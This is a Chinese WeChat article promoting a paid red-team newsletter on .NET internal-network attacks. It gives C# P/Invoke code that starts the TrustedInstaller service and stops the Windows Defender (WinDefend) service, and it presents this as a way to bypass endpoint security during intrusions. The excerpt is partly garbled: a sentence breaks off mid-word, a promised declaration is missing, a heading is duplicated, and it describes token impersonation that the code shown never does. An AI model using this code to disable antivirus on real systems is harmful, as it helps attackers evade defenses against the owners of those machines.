---
title: .NET内网实战：模拟Installer关闭Defender
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=1&sn=8ec124be34918b8229f11a9b3eaea3d4&chksm=fa5947adcd2ecebb48e628d922aada32551c5a843b8520bcbe69cc0850cafa0cf85aa089ccd2&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-05
fetch_date: 2025-10-06T18:01:02.248374
---

# .NET内网实战：模拟Installer关闭Defender

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Yib9E0ZjOibibAOGPOXkjej9RyoVtkGkX5S0uicamHZJ74hc1ibIsibaGfaWwl8x6djFKKYA8lKSURUTzoQ/0?wx_fmt=jpeg)

# .NET内网实战：模拟Installer关闭Defender

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

基本介绍

本文内容部分节选自小报童《.NET 通过模拟TrustedInstaller关闭Windows Defender》，完整的文章内容请加入小报童后订阅查看。现在限时只需49元，永久买断！目前已有160+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5bfXqQl04N7ZG7lyLAJmVenj3yQzd6YpU3VjL3azz29PVxv6YlNBcIQ/640?wx_fmt=png&from=appmsg)

03

编码实现

原理上通过Windows API函数将当前进程的权限提升至TrustedInstaller，从而实现了对Windows Defender服务的控制。通常可以利用Windows API中的OpenSCManager、OpenProcessToken、ImpersonateLoggedOnUser以及ControlService等函数协同工作，来实现对Windows Defender服务的关闭操作。

## 3.1 启动TrustedInstaller

ZwQueryInformationProcess函数用于获取指定进程的信息，如进程ID、父进程信息等，ReadProcessMemory函数用于从指

通过调用OpenSCManager、OpenService、StartService这三个API方法启动一个TrustedInstaller 服务。调用函数代码如下所示。

```
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "OpenSCManagerW", ExactSpelling = true, SetLastError = true)]
public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
```

OpenService函数用于打开服务控制管理器（SCM）数据库中指定的服务，方便进行下一步的操作（如启动、停止等），具体代码如下所示。

```
[DllImport("advapi32", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
```

StartService函数是Windows Service Control Manager (SCM) API的一部分，用于启动一个已安装的服务。为了便于使用，我们封装成一个自定义方法start\_trustedinstaller\_service，具体代码如下所示。

```
public static void start_trustedinstaller_service()
{
   IntPtr intPtr = Program.OpenSCManager(null, null, 0xF003F);
   bool flag = intPtr == IntPtr.Zero;
   if (flag)
   {
    Console.WriteLine("OpenSCManager failed!");
   }
   else
   {
    Console.WriteLine("OpenSCManager success!");
    string lpServiceName = "TrustedInstaller";
    IntPtr intPtr2 = Program.OpenService(intPtr, lpServiceName, (uint) SERVICE_ACCESS.SERVICE_START);
    bool flag2 = Program.StartService(intPtr2, 0, null);
    bool flag3 = flag2;
    if (flag3)
    {
     Console.WriteLine("TrustedInstaller service started!");
    }
    else
    {
     Console.WriteLine("TrustedInstaller service cannot be started!");
    }
    Thread.Sleep(2000);
    Program.CloseHandle(intPtr2);
    Program.CloseHandle(intPtr);
   }
}
```

上述代码中，依次调用系统API函数OpenSCManager，用于打开服务控制管理器数据库，并返回一个句柄。参数 null 表示连接到本地计算机，0xF003F 是访问权限标志，表示具有完全访问权限。

接着，声明一个值为TrustedInstaller的变量ServiceName，使用 OpenService 函数打开 TrustedInstaller 服务，并返回一个服务句柄。SERVICE\_ACCESS.SERVICE\_START 权限表示具有启动服务的权限。

最后，调用API 函数 StartService 启动 TrustedInstaller 服务。

## 3.2 启动TrustedInstaller

通过调用OpenService、ControlService等API函数来关闭Windows Defender。调用函数代码如下所示。

```
[DllImport("advapi32.dll", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ControlService(IntPtr hService, Program.SERVICE_CONTROL dwControl, ref Program.SERVICE_STATUS lpServiceStatus);
```

ControlService函数，用于控制Windows服务的，包括启动、停止、暂停等。最后，我们封装成一个自定义方法stop\_defender\_service，实现的过程利用ControlService函数打开Windows Defender服务，将服务的句柄权限标志设置成SERVICE\_STOP即可，具体实现代码如下所示。

```
public static void stop_defender_service()
  {
   IntPtr intPtr = Program.OpenSCManager(null, null, 983103U);
   bool flag = intPtr == IntPtr.Zero;
   if (flag)
   {
    Console.WriteLine("OpenSCManager failed!");
   }
   else
   {
    Console.WriteLine("OpenSCManager success!");
    string lpServiceName = "WinDefend";
    IntPtr intPtr2 = Program.OpenService(intPtr, lpServiceName, 44U);
    Program.SERVICE_STATUS service_STATUS = default(Program.SERVICE_STATUS);
    bool flag2 = Program.ControlService(intPtr2, Program.SERVICE_CONTROL.STOP, ref service_STATUS);
    bool flag3 = flag2;
    if (flag3)
    {
     Console.WriteLine("Windefender service stopped!");
    }
    else
    {
     Console.WriteLine("Windefender service cannot be stopped!");
    }
    Thread.Sleep(2000);
    Program.CloseHandle(intPtr2);
    Program.CloseHandle(intPtr);
   }
  }
```

综上，通过一系列步骤成功模拟 TrustedInstaller 服务的令牌，从而停止 Windows Defender反病毒软件服务，也因此该方法在内网红队绕过Windows终端安全防护阶段具有重要的意义。想要了解完整或者更多的内网安全防御绕过方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需49元，永久买断！目前已有160+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Yib0Y9dkVCH34QoFqiaaZ738Kz9ziafiaEWnUkJYNk4SiajHbD8J6skkR0jK9ecycszmxP827PTibRx0jvA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过